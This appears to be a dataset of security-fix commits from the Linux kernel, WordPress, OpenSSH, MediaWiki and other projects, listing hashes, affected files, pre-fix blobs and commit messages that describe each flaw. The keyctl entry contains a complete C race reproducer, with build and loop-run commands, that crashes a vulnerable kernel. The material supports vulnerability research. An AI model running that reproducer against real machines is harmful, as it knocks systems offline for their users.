    e4621511d118b5474c3fba22433fb09784556078
    e6178787ce3dd4a9b0e33b80b72ac39f73e25e33
Projects:
    0-T-0_ps4-linux
Commit Message for b6878d9e03043695dbf3fa1caa6dfc09db225b16:
md: use kzalloc() when bitmap is disabled\n\nIn drivers/md/md.c get_bitmap_file() uses kmalloc() for creating a mdu_bitmap_file_t called "file".\n\n5769         file = kmalloc(sizeof(*file), GFP_NOIO)  5770         if (!file) 5771                 return -ENOMEM \n\nThis structure is copied to user space at the end of the function.\n\n5786         if (err == 0 && 5787             copy_to_user(arg, file, sizeof(*file))) 5788                 err = -EFAULT\n\nBut if bitmap is disabled only the first byte of "file" is initialized with zero, so it's possible to read some bytes (up to 4095) of kernel space memory from user space. This is an information leak.\n\n5775         /* bitmap disabled, zero the first byte and copy out */ 5776         if (!mddev->bitmap_info.file) 5777                 file->pathname[0] = '\0' \n\nSigned-off-by: Benjamin Randazzo <benjamin@randazzo.fr> Signed-off-by: NeilBrown <neilb@suse.com>

======================================================================
Commit With Fix: 
    f15133df088ecadd141ea1907f2c96df67c729f0
File(s) In Commit: 
    fs/namei.c
Blob(s) In Commit: 
    fe30d3be43a8b381d3b9ac3016b28531996f91b7
Blob(s) Before Fix: 
    0b3138de2a3b79fd8d1bf1843e405506f343f605
    157c3dbacf6c55b3b4323e760808eb6ddf207cb8
    2dad0eaf91d34d8f47d3cc525eafd45107d429bd
    2f730ef9b4b3da78afd6a830c13c7ba13c706ffe
    3531deebad3084104e6a9fca7116ba68890ad5af
    43927d14db67c68706ef8dd208c714ec2ec6addb
    4a8d998b7274b3406532cc012d05ee18aa9b5bba
    4b491b4319905b2dd6698d3f58aae1d0d0141499
    4fc034ffd20908cc245102f690ce77ec8d9457d0
    5008f01787f5681730a9273693a1a863e7e6cc7e
    50a8583e81565f4558365db1fa47227360e4787d
    5f4cdf3ad913fec928835d87fbe499efdf7d67e5
    76fb76a0818bc274fc67b2d87b582db6690d62a6
    80168273396bbaeb4490677854fe34d637a78551
    a7b05bf82d31ad2e8eacbac999a049cab1f8d446
    bc35b02883bb968812a7ec7cb62f4e1ff6e88de3
    c83145af4bfc0ea9bb159002e3545e8a8cd65157
    caa38a24e1f726a91b8579a86ef94888ea0e093e
    d4ca42085e1db50ff284b2a2629f4c3ff3a30e16
    db5fe86319e69d51e59ff6dd0053d199b406bdc9
    e2ba62820a0f35ee0531a4ad6ac0dc6725ad0b58
    ec97aef5c21cc40e08074c48a9c34a41568694da
    f67cf6cef9866ec3c70f1058a93693e939535281
    ffab2e06e1472eca41449cbe5d8fe22baa219d29
Projects:
    0-T-0_ps4-linux
Commit Message for f15133df088ecadd141ea1907f2c96df67c729f0:
path_openat(): fix double fput()\n\npath_openat() jumps to the wrong place after do_tmpfile() - it has already done path_cleanup() (as part of path_lookupat() called by do_tmpfile()), so doing that again can lead to double fput().\n\nCc: stable@vger.kernel.org	# v3.11+ Signed-off-by: Al Viro <viro@zeniv.linux.org.uk>

======================================================================
Commit With Fix: 
    9c57f3a4291f2311ae05f22c10eedeb0f69337ab
File(s) In Commit: 
    wp-includes/class-wp-xmlrpc-server.php
Blob(s) In Commit: 
    9121c07a17237578a52b71ff5999b3d4df02826e
Blob(s) Before Fix: 
    08897dc032f12ab4ecca726f38647beea0c412bf
    0f617dbf99b4399490f89801ae66f6069caf3351
    10c593d2a49d0e0c3d057d6e7557fea10a2443fa
    14b83343b11c4bcf8f00522b969a182eca435542
    1ab005b8d8a73825cfec35c7a661755c8a98607f
    1cb0d0fa2524b3b39e44b6d08f83fc7c3adb68a8
    24807cd2abba071da640689e017d336af0f624e5
    255a29c4401b87b64efcbd9fd7ae6fe624c25c1e
    3080696ff738be4205e75170732307d68726e295
    4a68aaae5ae6f8d2b9cf251e38960ba75a45e35c
    4ea5df60f8d94282e976c38b2db69c5409aae335
    5084da65cb9d754aa06977cff1e9a9ae2d592379
    531dd50c9ead4ed1898a78e071973a3b1209ec5c
    5be4dc9b45a42dd60acb13a959d340d4b3be5abf
    726aa06d6d98d65c7ed839d9c406d2f05d4e08e1
    78288bd2787b93d56674edc1b3d1ea51e268483a
    826f2efdfed32c8ce165cab1e3c8c1cb68b985a1
    8660bfdc5afe63854baf06be0374ad4f41b31c9f
    89bf512930c108e907a241b680936c0978d76e78
    8e7bfb6ce2dd27b92e2eef90c9299b328c6b6661
    922e0284a4b8e146d1dfd1f3eb4db47911b64ee5
    9d92cecff02e6a2b3356577d7a187c34bf85503c
    a0827cac41c7fa242b893a5d6ac9a3415816ca53
    a1742965976f632603f8b87a87f37a8b8a8c2cc3
    aac66314937d21376dc42b6bb9da75975b9f63a4
    ac758e4c1b81331066049923d741b607d3e221fd
    ba96d2fb90ceec565ad3f7b6f734e44e1178ce53
    bdabf98e7a84c86040652539caecc02909187815
    be2d3edb7dfb9d76d6f9799ddac532b9e4f56ba5
    c81967ff97de64e5031a5824bc962cec21ec01d0
    cc7c9a46dc2bed4e145c313fbd03725ed49d9d29
    d3ebdb8bb3ab2cc7604794505ced0f0434e26c22
    d726143cfd4cce80ca0ec4ec35daf673bf6f2388
    e07f7ed3d1c3b2b4a7feb3ec83571f72b193cbda
    e4a2d961fa61d27ea116d06529211468fb8dd926
    e69de29bb2d1d6434b8b29ae775ad8c2e48c5391
    fa776461c8b92c326fa7041882c4684ddb5f20ce
Projects:
    023yangbo_WordPress
Commit Message for 9c57f3a4291f2311ae05f22c10eedeb0f69337ab:
XMLRPC: Don't allow private posts to be sticky.\n\nMerge of [34135] to the 4.3 branch.\n\nSee #20662. Built from https://develop.svn.wordpress.org/branches/4.3@34151\n\n git-svn-id: http://core.svn.wordpress.org/branches/4.3@34119 1a063a9b-81f0-0310-95a4-ce76da25c4cd

======================================================================
Commit With Fix: 
    0dde92def6b9f276f05ff77abb07ead318f9ec23
File(s) In Commit: 
    system/database/DB_active_rec.php
Blob(s) In Commit: 
    33e2ea27af2657b28f5f3a2277d559085860cda9
Blob(s) Before Fix: 
    00cc5a92196df2551798fbf3512112fa322135ec
    0238c73489769012675756b194aeca2d0b1e4854
    02cfecbe13efd33660abf9126705bd686ccd371c
    07021999f8695433db3d1e878559782924cf6e95
    09ff408d812c8ee657ed0d388f3459170f20c8dc
    10febb1fccc350b14e2de0df3d902400373171a3
    129eaa7b626da139bb774cd366b2ef7bb4b5f556
    249ae3afc47b77f9d5047e970f27f96771a69e78
    2af3553ed4a4de983678f48e3cb0e25942196058
    3341d95f96b458bd4f2290c085e3d2d1595d905f
    3beb3692cd2dc6f0d73f60af221cc7e54c74c890
    446d6836c33002fe7c0b55f3f4251107ce308b67
    614e8d5a27b4c7644c56566520d61c303230faa2
    653f1b7285f4e69c6c381638ac158a60edf012f4
    73349ee81c690b7539d096cf9c6c0586ef9cc510
    7bab729f50007157d14c22bb1f80136e383a9e5c
    7fa9f92451081aea8992d97c037f1cb3c5f09015
    85faa555dd6af8c0bfc3acb4978798a6a4dbade7
    972a0c552eea13aa87684130e1cb7e1cb015b259
    a74ae27852b52135cf9f1ac908c62d3233760a4c
    ce9d1c1af152ba2c3adf4c996391b804ecdb7681
    db8471364b9f54e4946dda911342442c62081565
    de5c68bea7874959a010fb522a5fb49b5c3786fc
    ee72dbbf4342b493569bf1d5a3d70af63e890f33
    f26483163ba8a90d24fa42862d6d6e13abb5dd81
    f4b796cc1f3329574842b62ce8fd5cce76c2fd5d
Projects:
    0000000000000000000_CodeIgniter
Commit Message for 0dde92def6b9f276f05ff77abb07ead318f9ec23:
fixes potential SQL injection vector in Active Record offset()

======================================================================
Commit With Fix: 
    b1b3fd61c7697ad2073cd253d31c9462929e7bb5
File(s) In Commit: 
    modules/Configurator/UploadFileCheck.php
Blob(s) In Commit: 
    37c565cef1625405b8a24d9c5010b9777a75fde8
Blob(s) Before Fix: 
    e1e754124f63b08bf506bdcb2babaf9d44b61678
Projects:
    13ttys_SuiteCRM
Commit Message for b1b3fd61c7697ad2073cd253d31c9462929e7bb5:
Don't leave files which fail the upload check in the tmp company logo directory.

======================================================================
Commit With Fix: 
    8558533a9148a2a0302c9c177abff8e4e4075b92
File(s) In Commit: 
    lib/classes/database/class.Database.php
Blob(s) In Commit: 
    85ed594b6e946d73ed9b6ec33d6e17d2e8320c4d
Blob(s) Before Fix: 
    7c39ecfb628b9c5283501c64008bbd98eca41785
Projects:
    23networks_Froxlor
Commit Message for 8558533a9148a2a0302c9c177abff8e4e4075b92:
replace passwords even before logging, not just for display\n\nSigned-off-by: Michael Kaufmann (d00p) <d00p@froxlor.org>

======================================================================
Commit With Fix: 
    79cca974a4c2ab1199786732a67ff6d898051b78
File(s) In Commit: 
    miniupnpc/igd_desc_parse.c
Blob(s) In Commit: 
    d2999ad011c40d8b1a78208d42e9dff5ddd8d76f
Blob(s) Before Fix: 
    0eaf21b6a25ea2cb2bd2bd4f4ad857a0adca1a95
    1f7648469278f5d4c16a672c1608b67c32459c9b
    6c3e65677d70467543172966d81159d0118b041d
    7b6a84c8a1fa4776b345e6181a2d2f42baee7b82
    80ae265f381e67a40dba111ed9a54030816e567c
    80b552d7cd3a0ccd2031216dd08e8cecdd6d3269
    892a09025ebf27cb08f5bed732d16296dd9a56d5
    90d2e79601270e99d42fbe925706f4a9ef9561b2
    a439662326ad5bea3241897e7c3c2ae198a493c7
Projects:
    007jasonsmith_Catch
Commit Message for 79cca974a4c2ab1199786732a67ff6d898051b78:
igd_desc_parse.c: fix buffer overflow

======================================================================
Commit With Fix: 
    9d65a945029c7be7bb6bc893759e74c5636be694
File(s) In Commit: 
    simple-php-captcha.php
Blob(s) In Commit: 
    2547908771cea668dfc718da7fcc2f5916bce7e7
Blob(s) Before Fix: 
    5505734fe7ba8b9eb5901f5cece1c59cb3aee7a4
    8ae43823b5bbc8c8c2e369611557eb279ea36a82
    8d4f53cc30b13bb10da984a6ef1af2a96c5626a0
Projects:
    0xIIDe231_php-captcha
Commit Message for 9d65a945029c7be7bb6bc893759e74c5636be694:
Merge pull request #17 from ALSchwalm/master\n\nSwitch from rand to mt_rand

======================================================================
Commit With Fix: 
    7932c0bd7740f4cd2aa168d3ce0199e7af7d72d5
File(s) In Commit: 
    drivers/vhost/vhost.c
Blob(s) In Commit: 
    95bdb90fd7f06a13a99e2d37a2c97aabc4545c05
Blob(s) Before Fix: 
    a9fe859f43c874b39d6a2e7f8bb884abe1b16736
    c90f4374442a571610da46b56dc94d51a3e26feb
Projects:
    0-T-0_ps4-linux
Commit Message for 7932c0bd7740f4cd2aa168d3ce0199e7af7d72d5:
vhost: actually track log eventfd file\n\nWhile reviewing vhost log code, I found out that log_file is never set. Note: I haven't tested the change (QEMU doesn't use LOG_FD yet).\n\nCc: stable@vger.kernel.org Signed-off-by: Marc-André Lureau <marcandre.lureau@redhat.com> Signed-off-by: Michael S. Tsirkin <mst@redhat.com>

======================================================================
Commit With Fix: 
    9a5cbce421a283e6aea3c4007f141735bf9da8c3
File(s) In Commit: 
    arch/powerpc/perf/callchain.c
Blob(s) In Commit: 
    ead55351b2542accc663c496be8592b9c3942b08
Blob(s) Before Fix: 
    02d3f3abd8dda8107f28d31806a1665475a3da4d
    0fc26714780acd95e3df8043c4a764d1e823aefc
    2396dda282cdef0ed5c11c6ab7c3f4f479d0ac04
    63bc981cea52a05910f55c122c4ba4558ea10ec1
    6ed06d0b2188797eeb2cc655bfa960a406ee9593
    74d1e780748b58f17f8987218a6184c87aae63da
    a9bd794652c92a8ac33a1bfd195b6427e98293c0
    b8a9c0ce8438b93a14a4448376ca83bb1bd98818
    e04a6752b39991bbdf5ba389aef524182511fa9c
    e8a18d1cc7c92ba51a6187920c3f624db0620038
    ff09cde20cd275563f71faaee7b153ce39a3ba08
Projects:
    0-T-0_ps4-linux
Commit Message for 9a5cbce421a283e6aea3c4007f141735bf9da8c3:
powerpc/perf: Cap 64bit userspace backtraces to PERF_MAX_STACK_DEPTH\n\nWe cap 32bit userspace backtraces to PERF_MAX_STACK_DEPTH (currently 127), but we forgot to do the same for 64bit backtraces.\n\nCc: stable@vger.kernel.org Signed-off-by: Anton Blanchard <anton@samba.org> Signed-off-by: Michael Ellerman <mpe@ellerman.id.au>

======================================================================
Commit With Fix: 
    5e75f5198769056089fb06c4d738ab0e5abc66f7
File(s) In Commit: 
    monitor.c
Blob(s) In Commit: 
    a91420983ba86eda2619e629265897b3fefed53a
Blob(s) Before Fix: 
    16d82a7a32b98ebd4562206d41d26351565f7ff6
    2a825bcbd5a9c425f74ccee864514d90e3064d8e
    2d3e298f6622f6bc34e7d2a314180bd8ea6e765b
    531c4f9a8518f93d681d3d9fda1733a6fc33228d
    7af19b12a179d1b24d5acad149535f0ce7435549
    9eb4e35c97e1166caa9e34fb9f8fb6e1a3f5fb13
    af63490cf5a0c5392843d1606da3735fceb6f95b
    b4109657efdf546b119f9a82693e66f4e557e7d5
    f1b873dc4d7db3a59272dd64eccd83550731866c
Projects:
    0-T-0_docker
    0neday_openssh-portable
Commit Message for 5e75f5198769056089fb06c4d738ab0e5abc66f7:
set sshpam_ctxt to NULL after free\n\nAvoids use-after-free in monitor when privsep child is compromised. Reported by Moritz Jodeit  ok dtucker@

======================================================================
Commit With Fix: 
    5faabfa1bbf65536ea36108887040198afcb3c82
File(s) In Commit: 
    includes/specials/SpecialDeletedContributions.php
Blob(s) In Commit: 
    44352a78b5023fa92de9ac8307737e5eaaea19fc
Blob(s) Before Fix: 
    2e101e91601876493ccacef7932ac36ee7e98bee
    3498a16d839ca26b2821b397b1fefff0fffded9e
    67b05ca186770001ff363e8a755966181e400fea
    680aa35933fa8e41b05d4dc218c03878b560630e
    68f2c4695db14261df93d5bc2033b24711792ac4
    8c7f0c89c1cd2edead6274513aba50e0eeb4e592
    9b9888adf342fc057a9fa2b3833237df141a71c1
    9e4bbbe532020f0abec10be3065ad66a831ed778
    a198567934d1afdc82847e80808886043730d146
    b790fdf5a85312ac80f8256d60236bd2fcb6e350
    e374979e3317f718615276680330b0f7ea09d4fc
    fb85942df600e2e5aed80760b904b453150eb694
Projects:
    0x047d_mediawiki
Commit Message for 5faabfa1bbf65536ea36108887040198afcb3c82:
SECURITY: Don't disclose if an IP is autoblocked on Special:DeletedContributions\n\nSame patch as dc2966bd05b, just for Special:DeletedContributions this time.\n\nBug: T106893 Change-Id: I2089b21fc379b612fe9bf087b5f4ea75052bdbd3

======================================================================
Commit With Fix: 
    7ca3e5279d05fceb1e8a043c6f5b6f58dea3ed38
File(s) In Commit: 
    src/client.c
Blob(s) In Commit: 
    2b01ff2ccdb45089055fa35d22f79ffa17f4761e
Blob(s) Before Fix: 
    99615a0e3e4c13c161d14f79c39c0112a3574570
Projects:
    CartoDB_pgbouncer
Commit Message for 7ca3e5279d05fceb1e8a043c6f5b6f58dea3ed38:
Remove too early set of auth_user\n\nWhen query returns 0 rows (user not found), this user stays as login user...\n\nShould fix #69.

======================================================================
Commit With Fix: 
    74e98eb085889b0d2d4908f59f6e00026063014f
File(s) In Commit: 
    net/rds/connection.c
Blob(s) In Commit: 
    49adeef8090caea90be3e42702276314bca1d118
Blob(s) Before Fix: 
    14f041398ca1744ea7596decaad7145184c7df0c
    378c3a6acf84cab59346ab832d2fffba33e6e543
    642ad42c416ba915680645d8bc3539e5bdee4bf5
    9b2de5e67d7951a76be6d8c23048b906afe810a7
    a50e652eb269dce22f52900754839537678ebda8
    d4564036a339a04d31c65ec6c90cdc9e6a051efc
    da6da57e5f36b5cc13a5bc92abfedb6a5ccea45d
    e3b118cae81d5e859e0244df1bf323aaa1798b8e
Projects:
    0-T-0_ps4-linux
Commit Message for 74e98eb085889b0d2d4908f59f6e00026063014f:
RDS: verify the underlying transport exists before creating a connection\n\nThere was no verification that an underlying transport exists when creating a connection, this would cause dereferencing a NULL ptr.\n\nIt might happen on sockets that weren't properly bound before attempting to send a message, which will cause a NULL ptr deref:\n\n[135546.047719] kasan: GPF could be caused by NULL-ptr deref or user memory accessgeneral protection fault: 0000 [#1] PREEMPT SMP DEBUG_PAGEALLOC KASAN [135546.051270] Modules linked in: [135546.051781] CPU: 4 PID: 15650 Comm: trinity-c4 Not tainted 4.2.0-next-20150902-sasha-00041-gbaa1222-dirty #2527 [135546.053217] task: ffff8800835bc000 ti: ffff8800bc708000 task.ti: ffff8800bc708000 [135546.054291] RIP: __rds_conn_create (net/rds/connection.c:194) [135546.055666] RSP: 0018:ffff8800bc70fab0  EFLAGS: 00010202 [135546.056457] RAX: dffffc0000000000 RBX: 0000000000000f2c RCX: ffff8800835bc000 [135546.057494] RDX: 0000000000000007 RSI: ffff8800835bccd8 RDI: 0000000000000038 [135546.058530] RBP: ffff8800bc70fb18 R08: 0000000000000001 R09: 0000000000000000 [135546.059556] R10: ffffed014d7a3a23 R11: ffffed014d7a3a21 R12: 0000000000000000 [135546.060614] R13: 0000000000000001 R14: ffff8801ec3d0000 R15: 0000000000000000 [135546.061668] FS:  00007faad4ffb700(0000) GS:ffff880252000000(0000) knlGS:0000000000000000 [135546.062836] CS:  0010 DS: 0000 ES: 0000 CR0: 000000008005003b [135546.063682] CR2: 000000000000846a CR3: 000000009d137000 CR4: 00000000000006a0 [135546.064723] Stack: [135546.065048]  ffffffffafe2055c ffffffffafe23fc1 ffffed00493097bf ffff8801ec3d0008 [135546.066247]  0000000000000000 00000000000000d0 0000000000000000 ac194a24c0586342 [135546.067438]  1ffff100178e1f78 ffff880320581b00 ffff8800bc70fdd0 ffff880320581b00 [135546.068629] Call Trace: [135546.069028] ? __rds_conn_create (include/linux/rcupdate.h:856 net/rds/connection.c:134) [135546.069989] ? rds_message_copy_from_user (net/rds/message.c:298) [135546.071021] rds_conn_create_outgoing (net/rds/connection.c:278) [135546.071981] rds_sendmsg (net/rds/send.c:1058) [135546.072858] ? perf_trace_lock (include/trace/events/lock.h:38) [135546.073744] ? lockdep_init (kernel/locking/lockdep.c:3298) [135546.074577] ? rds_send_drop_to (net/rds/send.c:976) [135546.075508] ? __might_fault (./arch/x86/include/asm/current.h:14 mm/memory.c:3795) [135546.076349] ? __might_fault (mm/memory.c:3795) [135546.077179] ? rds_send_drop_to (net/rds/send.c:976) [135546.078114] sock_sendmsg (net/socket.c:611 net/socket.c:620) [135546.078856] SYSC_sendto (net/socket.c:1657) [135546.079596] ? SYSC_connect (net/socket.c:1628) [135546.080510] ? trace_dump_stack (kernel/trace/trace.c:1926) [135546.081397] ? ring_buffer_unlock_commit (kernel/trace/ring_buffer.c:2479 kernel/trace/ring_buffer.c:2558 kernel/trace/ring_buffer.c:2674) [135546.082390] ? trace_buffer_unlock_commit (kernel/trace/trace.c:1749) [135546.083410] ? trace_event_raw_event_sys_enter (include/trace/events/syscalls.h:16) [135546.084481] ? do_audit_syscall_entry (include/trace/events/syscalls.h:16) [135546.085438] ? trace_buffer_unlock_commit (kernel/trace/trace.c:1749) [135546.085515] rds_ib_laddr_check(): addr 36.74.25.172 ret -99 node type -1\n\nAcked-by: Santosh Shilimkar <santosh.shilimkar@oracle.com> Signed-off-by: Sasha Levin <sasha.levin@oracle.com> Signed-off-by: David S. Miller <davem@davemloft.net>

======================================================================
Commit With Fix: 
    c0689e32154c41f59840ae10ffc5fbfa30618710
File(s) In Commit: 
    salt/states/user.py
Blob(s) In Commit: 
    b31ec0c69b567e2604201452c9f12a1e1206a426
Blob(s) Before Fix: 
    0fda31d38d15ab0fcabc9463e44753f39a58accf
    1f269b3aa64eb8611830dda41a8004563c2d9424
    b008037098f0505e5d430abc6f3574d11bdd6816
Projects:
    0decimal0_salt
Commit Message for c0689e32154c41f59840ae10ffc5fbfa30618710:
Replaced password with redacted when displayed

======================================================================
Commit With Fix: 
    ce68a88293ce3b18c261312392ad33a88bb69ea1
File(s) In Commit: 
    lib/gollum/app.rb
Blob(s) In Commit: 
    3fde8bf27fea852650b8a1ecd0f36be1c574c8b7
Blob(s) Before Fix: 
    12e47541a1196d06bc6cf1ec4c3421358fab1568
Projects:
    0bit_gollum
Commit Message for ce68a88293ce3b18c261312392ad33a88bb69ea1:
Added security check.

======================================================================
Commit With Fix: 
    c9b92530a723ac5ef8e352885a1862b18f31b2f5
File(s) In Commit: 
    fs/ext4/namei.c
Blob(s) In Commit: 
    8f4bda75122e749e9b138a1b22e206c34ecfc0e8
Blob(s) Before Fix: 
    2043f482375d000c517093f844ed2ce873802a0e
    2a42cc04466f6858f55fea7e4a8beb2f1232319f
    349d7b3671c863ce1565a5d2a184c6bbdafbf6e3
    37c03b32e194124fbf523b017f8e23245b738547
    5845cd97bf8b094b0fc01082279e8d65ee73f241
    e2a3f4b0ff78d6f81fbf2228f12f201e6ab1a024
Projects:
    0-T-0_ps4-linux
    0day-ci_xen
Commit Message for c9b92530a723ac5ef8e352885a1862b18f31b2f5:
ext4: make orphan functions be no-op in no-journal mode\n\nInstead of checking whether the handle is valid, we check if journal is enabled. This avoids taking the s_orphan_lock mutex in all cases when there is no journal in use, including the error paths where ext4_orphan_del() is called with a handle set to NULL.\n\nSigned-off-by: Anatol Pomozov <anatol.pomozov@gmail.com> Signed-off-by: "Theodore Ts'o" <tytso@mit.edu>

======================================================================
Commit With Fix: 
    cb31827d62066a04b02111df3052949fda4b6888
File(s) In Commit: 
    src/nss-mymachines/nss-mymachines.c
Blob(s) In Commit: 
    c98a959b3b6d8af3c2df6a90e60cb9df64c94b74
Blob(s) Before Fix: 
    969fa9619e17454070a4ed6335eeef38f8dc85ac
Projects:
    0x277F_systemd
Commit Message for cb31827d62066a04b02111df3052949fda4b6888:
nss-mymachines: do not allow overlong machine names\n\nhttps://github.com/systemd/systemd/issues/2002

======================================================================
Commit With Fix: 
    0185604c2d82c560dab2f2933a18f797e74ab5a8
File(s) In Commit: 
    arch/x86/kvm/x86.c
Blob(s) In Commit: 
    7ffc224bbe4127a90ef7741f09ae94f75e17feec
Blob(s) Before Fix: 
    00462bd63129cfbde2c6b7e7bdf50eb073cc31b8
    32bf19ef3115f65c9dffc23a655be2763babcaff
    43609af032833fdfb977daac4961785ebb4396f0
    4c938da2ba00b40dc430d5a7854b0ee62b6ce631
    8f0f6eca69da1dc6db95c16782871580bf57091d
    92511d4b72364a978db0b38628b9449907ee1832
    991466bf8dee4ab202f422e64c0d211bb5f439fe
    9a9a198303219b6430159af03d4d1e1d898ec6f7
    a60bdbccff5189b5a98b9a7fcc6a3b9f7ff5eeec
    ac165c2fb8e54a307cb3f70a5e990635f95978b2
    b84ba4b17757aed24d0385ae7211b80985b61eb6
    bd7a70be41b35fa93ad952060fc2c7f432e5628e
    c259814200bd340b54014a1869d914ec3674caed
    ea306adbbc13603591d46d3f062cc20cf1bc37d1
    eed32283d22cc0cafbff75e8f2a246887d4cbb5f
Projects:
    0-T-0_ps4-linux
Commit Message for 0185604c2d82c560dab2f2933a18f797e74ab5a8:
KVM: x86: Reload pit counters for all channels when restoring state\n\nCurrently if userspace restores the pit counters with a count of 0 on channels 1 or 2 and the guest attempts to read the count on those channels, then KVM will perform a mod of 0 and crash.  This will ensure that 0 values are converted to 65536 as per the spec.\n\nThis is CVE-2015-7513.\n\nSigned-off-by: Andy Honig <ahonig@google.com> Signed-off-by: Paolo Bonzini <pbonzini@redhat.com>

======================================================================
Commit With Fix: 
    8e20cf2bce122ce9262d6034ee5d5b76fbb92f96
File(s) In Commit: 
    drivers/input/tablet/aiptek.c
Blob(s) In Commit: 
    78ca44840d60cac1467c90cb563cedf2a05fcaab
Blob(s) Before Fix: 
    205d16aab441990283afd4f0068f97b106dcd198
    3954d0c59c45664686b35a0ec983636ca3b75c8f
    40a166773c1b4b244df04b11afaf4b1a883bcdb8
    4613f0aefd087b7dabe28750ed8b1e9de6e64646
    545fa6e890354f4ad8d5cac6384849da70f8017e
    7d005a3616d7187b1f228ebf10136df46228b67e
    c82cd5079d0e6207cc22a6ed5f2155f2e6d156e2
    d5ef3debd0455c8cb792e21e60bde573c37ce069
    d67547bded3ea844e396280e406ce723a08198d5
    e7f966da6efa318f1901ce912e4e0dd65b5c70f7
    ee83c3904ee83e2c3fd48770131f9430b6384141
    fcf9aa1eb167914e97eebd899e0e349496c08f66
Projects:
    0-T-0_ps4-linux
Commit Message for 8e20cf2bce122ce9262d6034ee5d5b76fbb92f96:
Input: aiptek - fix crash on detecting device without endpoints\n\nThe aiptek driver crashes in aiptek_probe() when a specially crafted USB device without endpoints is detected. This fix adds a check that the device has proper configuration expected by the driver. Also an error return value is changed to more matching one in one of the error paths.\n\nReported-by: Ralf Spenneberg <ralf@spenneberg.net> Signed-off-by: Vladis Dronov <vdronov@redhat.com> Signed-off-by: Dmitry Torokhov <dmitry.torokhov@gmail.com>

======================================================================
Commit With Fix: 
    570b5e854cecddd44d2047c44126aed951b61718
File(s) In Commit: 
    lib/colorscore/histogram.rb
Blob(s) In Commit: 
    4debcd58f82d658c6fc91e21e1b230081bcc0b04
Blob(s) Before Fix: 
    3c2d1b1cef56f55e29b862a3a0d1babef1bcfcd5
Projects:
    cle61_colorscore
Commit Message for 570b5e854cecddd44d2047c44126aed951b61718:
Fix CVE-2015-7541\n\nAvoid passsing possible user input directly into the shell. Instead quote the `image_path` value before calling the `convert` command.\n\nSee here http://rubysec.com/advisories/CVE-2015-7541/ for more information.

======================================================================
Commit With Fix: 
    b4a1b4f5047e4f54e194681125c74c0aa64d637d
File(s) In Commit: 
    security/keys/keyctl.c
Blob(s) In Commit: 
    1c3872aeed14ace421a9d43fc396c43afdd5b93c
Blob(s) Before Fix: 
    06ec722897be2107db29ea64db6627b090495af0
    0b3f5d72af1cecbd06b33c2151ec570a4cfaa2ee
    0b9ec78a7a7ad2b14af1ef0407e051e6dcef29ff
    18619690ce77a926307796ec3be1626a1023db4c
    26f0e0a11ed68568cc181071e0f04c2019f9f961
    2e741e1a8712cf195007b4d0e9ff52392b866e93
    33cfd27b4de29650ae6ad0e1eb45646714a00f27
    442e350c209d05c871ce04d567fa535e80efedfe
    4743d71e4aa6dd12f2456a5f00496c1222775c6a
    7576f49eeb345e1d767c4bc8d442508ca63cb5da
    bfea666f4fc546b3e82d400d68fc360e9210abf9
    cb1eef9ed4fd170244c1e9f7dc84a0ff6c63fdab
    cd5bd0cef25df3fce5801e938567e156d47f275f
    cee72ce642221e816968cb81069407fe01edb138
    d580ad06b792ff539f124a620a4c8791740f22dd
    dfc8c229e355a2b63d1cc7e108238f51613633ce
    ed73c6c1c326c02bf0f4f80923e4792f292ec2fd
    eff88a5f5d40da17611d381bcf4e219a90bcc972
    fb111eafcb893e4f5146c74a84f8499d4e1553c4
    fb767c6cd99f6a92da8fa989999a18988bce1a19
Projects:
    0-T-0_ps4-linux
Commit Message for b4a1b4f5047e4f54e194681125c74c0aa64d637d:
KEYS: Fix race between read and revoke\n\nThis fixes CVE-2015-7550.\n\nThere's a race between keyctl_read() and keyctl_revoke().  If the revoke happens between keyctl_read() checking the validity of a key and the key's semaphore being taken, then the key type read method will see a revoked key.\n\nThis causes a problem for the user-defined key type because it assumes in its read method that there will always be a payload in a non-revoked key and doesn't check for a NULL pointer.\n\nFix this by making keyctl_read() check the validity of a key after taking semaphore instead of before.\n\nI think the bug was introduced with the original keyrings code.\n\nThis was discovered by a multithreaded test program generated by syzkaller (http://github.com/google/syzkaller).  Here's a cleaned up version:\n\n	#include <sys/types.h> 	#include <keyutils.h> 	#include <pthread.h> 	void *thr0(void *arg) 	{ 		key_serial_t key = (unsigned long)arg  		keyctl_revoke(key)  		return 0  	} 	void *thr1(void *arg) 	{ 		key_serial_t key = (unsigned long)arg  		char buffer[16]  		keyctl_read(key, buffer, 16)  		return 0  	} 	int main() 	{ 		key_serial_t key = add_key("user", "%", "foo", 3, KEY_SPEC_USER_KEYRING)  		pthread_t th[5]  		pthread_create(&th[0], 0, thr0, (void *)(unsigned long)key)  		pthread_create(&th[1], 0, thr1, (void *)(unsigned long)key)  		pthread_create(&th[2], 0, thr0, (void *)(unsigned long)key)  		pthread_create(&th[3], 0, thr1, (void *)(unsigned long)key)  		pthread_join(th[0], 0)  		pthread_join(th[1], 0)  		pthread_join(th[2], 0)  		pthread_join(th[3], 0)  		return 0  	}\n\nBuild as:\n\n	cc -o keyctl-race keyctl-race.c -lkeyutils -lpthread\n\nRun as:\n\n	while keyctl-race  do :  done\n\nas it may need several iterations to crash the kernel.  The crash can be summarised as:\n\n	BUG: unable to handle kernel NULL pointer dereference at 0000000000000010 	IP: [<ffffffff81279b08>] user_read+0x56/0xa3 	... 	Call Trace: 	 [<ffffffff81276aa9>] keyctl_read_key+0xb6/0xd7 	 [<ffffffff81277815>] SyS_keyctl+0x83/0xe0 	 [<ffffffff815dbb97>] entry_SYSCALL_64_fastpath+0x12/0x6f\n\nReported-by: Dmitry Vyukov <dvyukov@google.com> Signed-off-by: David Howells <dhowells@redhat.com> Tested-by: Dmitry Vyukov <dvyukov@google.com> Cc: stable@vger.kernel.org Signed-off-by: James Morris <james.l.morris@oracle.com>

======================================================================
Commit With Fix: 
    cb3232138e37129e88240a98a1d2aba2187ff57c
File(s) In Commit: 
    drivers/usb/serial/visor.c
Blob(s) In Commit: 
    337a0be89fcf0767f67731a9b0a50700e1df9318
Blob(s) Before Fix: 
    1129aa73c23e93643ab273f578533ce85e04dc2c
    1c11959a7d588f8b25e03013b83a4c3008b452be
    210e4b10dc1126ade0a1ba9e04ea7a0485362404
    605068e6acf2c13cfcd552a7394788b12db93398
    60afb39eb73c0b95d261ec367890a306621fd2de
    69d313e98fadbf30838800beff1a5c77dac880b9
    71d696474f24d500ecd59af248a1e7f6e4dd0282
    7573ec8a084f3f55c1f2597c2f2b699e58790351
    879840ec06580535ca3a1f5d67d96b6a4ba6e029
    8ddbecc25d89ac6fbb2bc1a385b569d00f2737b2
    9910aa2edf4b1916c518e3f83d11e39ff94226a0
    9f3317a940ef6a8d88767eaa919bb4b61f6f13b6
